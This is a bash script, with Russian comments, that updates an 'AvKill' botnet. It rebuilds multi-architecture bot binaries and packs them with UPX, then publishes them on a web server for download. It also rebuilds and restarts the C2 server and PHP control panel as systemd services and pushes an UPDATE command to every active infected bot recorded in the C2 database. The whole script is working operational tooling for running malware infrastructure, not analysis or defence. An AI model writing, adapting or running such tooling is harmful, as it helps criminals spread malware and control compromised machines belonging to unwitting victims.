#!/bin/bash
# scripts/update.sh

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then 
        print_error "Please run as root"
        exit 1
    fi
}

backup_system() {
    print_status "Creating backup..."
    BACKUP_DIR="/opt/avkill-backup/$(date +%Y%m%d_%H%M%S)"
    mkdir -p $BACKUP_DIR
    
    # Копируем важные файлы
    cp -r /opt/avkill_botnet $BACKUP_DIR/ 2>/dev/null || true
    cp /etc/systemd/system/avkill-* $BACKUP_DIR/ 2>/dev/null || true
    
    # Бэкап баз данных
    if [ -f /opt/avkill_botnet/c2_server/c2.db ]; then
        sqlite3 /opt/avkill_botnet/c2_server/c2.db ".backup $BACKUP_DIR/c2.db.backup"
    fi
    
    print_success "Backup created: $BACKUP_DIR"
}

update_from_git() {
    print_status "Updating from Git..."
    
    cd /opt/avkill_botnet
    
    # Сохраняем локальные изменения
    git stash
    
    # Обновляем
    if git pull --rebase; then
        print_success "Git update successful"
    else
        print_error "Git update failed"
        git stash pop
        return 1
    fi
    
    git stash pop
}

update_dependencies() {
    print_status "Updating dependencies..."
    
    # Системные пакеты
    apt-get update
    apt-get upgrade -y
    
    # Компиляторы
    apt-get install -y \
        gcc g++ make \
        arm-linux-gnueabi-gcc \
        arm-linux-gnueabihf-gcc \
        mips-linux-gnu-gcc \
        mipsel-linux-gnu-gcc \
        mingw-w64 \
        upx-ucl \
        golang-go
    
    # Python зависимости
    pip3 install --upgrade \
        cryptography \
        paramiko \
        requests \
        colorama
    
    print_success "Dependencies updated"
}

rebuild_bots() {
    print_status "Rebuilding bots..."
    
    cd /opt/avkill_botnet/bot
    
    # Очистка старых сборок
    make clean
    
    # Сборка всех архитектур
    if make build_all; then
        print_success "Bots rebuilt successfully"
        
        # Копируем в папку для скачивания
        mkdir -p /var/www/html/bots
        cp build/* /var/www/html/bots/
        chmod 755 /var/www/html/bots/*
        
        print_success "Bots deployed to web server"
    else
        print_error "Bot rebuild failed"
        return 1
    fi
}

rebuild_c2() {
    print_status "Rebuilding C2 server..."
    
    cd /opt/avkill_botnet/c2_server
    
    # Обновление Go модулей
    go mod tidy
    go mod download
    
    # Пересборка
    if go build -o c2_server -ldflags="-s -w" main.go; then
        print_success "C2 server rebuilt"
        
        # Перезапуск службы
        systemctl restart avkill-c2
        print_success "C2 service restarted"
    else
        print_error "C2 rebuild failed"
        return 1
    fi
}

update_web_panel() {
    print_status "Updating web panel..."
    
    cd /opt/avkill_botnet/web_panel
    
    # Обновление конфигурации если нужно
    if [ ! -f config.php ] && [ -f config.example.php ]; then
        cp config.example.php config.php
        print_warning "New config.php created from example"
    fi
    
    # Обновление прав
    chown -R www-data:www-data /opt/avkill_botnet/web_panel
    chmod -R 755 /opt/avkill_botnet/web_panel
    
    # Перезапуск PHP сервиса
    systemctl restart avkill-web
    print_success "Web panel updated and restarted"
}

update_configs() {
    print_status "Updating configurations..."
    
    # Обновление конфигов ботов
    cd /opt/avkill_botnet
    python3 builder/builder.py --config
    
    # Обновление системных служб
    cat > /etc/systemd/system/avkill-c2.service << 'EOF'
[Unit]
Description=AvKill C2 Server
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/avkill_botnet/c2_server
ExecStart=/opt/avkill_botnet/c2_server/c2_server
Restart=always
RestartSec=3
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=avkill-c2

# Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

    cat > /etc/systemd/system/avkill-web.service << 'EOF'
[Unit]
Description=AvKill Web Panel
After=network.target
Wants=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/avkill_botnet/web_panel
ExecStart=/usr/bin/php -S 0.0.0.0:8080 -t /opt/avkill_botnet/web_panel
Restart=always
RestartSec=3
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=avkill-web

# Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    print_success "Configurations updated"
}

send_update_command() {
    print_status "Sending update command to bots..."
    
    # Отправляем команду UPDATE всем активным ботам
    if [ -f /opt/avkill_botnet/c2_server/c2.db ]; then
        # Получаем активных ботов
        BOTS=$(sqlite3 /opt/avkill_botnet/c2_server/c2.db \
            "SELECT ip FROM bots WHERE is_active = 1" 2>/dev/null)
        
        if [ -n "$BOTS" ]; then
            COUNT=0
            for BOT in $BOTS; do
                # Добавляем команду UPDATE в очередь
                sqlite3 /opt/avkill_botnet/c2_server/c2.db \
                    "INSERT INTO commands (bot_ip, command, status, created_at) \
                     VALUES ('$BOT', 'UPDATE', 'pending', strftime('%s','now'))" 2>/dev/null
                COUNT=$((COUNT + 1))
            done
            print_success "Update command sent to $COUNT bots"
        else
            print_warning "No active bots found"
        fi
    fi
}

check_services() {
    print_status "Checking services..."
    
    SERVICES=("avkill-c2" "avkill-web")
    
    for SERVICE in "${SERVICES[@]}"; do
        if systemctl is-active --quiet $SERVICE; then
            print_success "$SERVICE is running"
        else
            print_error "$SERVICE is not running"
            systemctl restart $SERVICE
            sleep 2
            if systemctl is-active --quiet $SERVICE; then
                print_success "$SERVICE restarted successfully"
            else
                print_error "Failed to start $SERVICE"
                systemctl status $SERVICE --no-pager
            fi
        fi
    done
}

show_summary() {
    print_status "=== Update Summary ==="
    
    # Версия
    if [ -f /opt/avkill_botnet/version.txt ]; then
        VERSION=$(cat /opt/avkill_botnet/version.txt)
        echo "Version: $VERSION"
    fi
    
    # Статистика ботов
    if [ -f /opt/avkill_botnet/c2_server/c2.db ]; then
        TOTAL_BOTS=$(sqlite3 /opt/avkill_botnet/c2_server/c2.db \
            "SELECT COUNT(*) FROM bots" 2>/dev/null || echo "0")
        ACTIVE_BOTS=$(sqlite3 /opt/avkill_botnet/c2_server/c2.db \
            "SELECT COUNT(*) FROM bots WHERE is_active = 1" 2>/dev/null || echo "0")
        echo "Bots: $ACTIVE_BOTS/$TOTAL_BOTS active"
    fi
    
    # Сервисы
    echo -n "Services: "
    if systemctl is-active --quiet avkill-c2 && systemctl is-active --quiet avkill-web; then
        echo -e "${GREEN}All running${NC}"
    else
        echo -e "${RED}Some services down${NC}"
    fi
    
    # URL
    IP=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
    echo "C2 Server: http://$IP:1337"
    echo "Web Panel: http://$IP:8080"
    
    print_status "======================="
}

main() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════╗"
    echo "║         AvKill Botnet Updater           ║"
    echo "║         Author: @kwavka                 ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    
    check_root
    
    # Бэкап
    backup_system
    
    # Обновление
    update_from_git
    update_dependencies
    rebuild_bots
    rebuild_c2
    update_web_panel
    update_configs
    
    # Отправка команды ботам
    send_update_command
    
    # Проверка
    check_services
    
    # Итог
    show_summary
    
    print_success "Update completed successfully!"
    print_warning "Don't forget to update default passwords!"
}

# Запуск
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi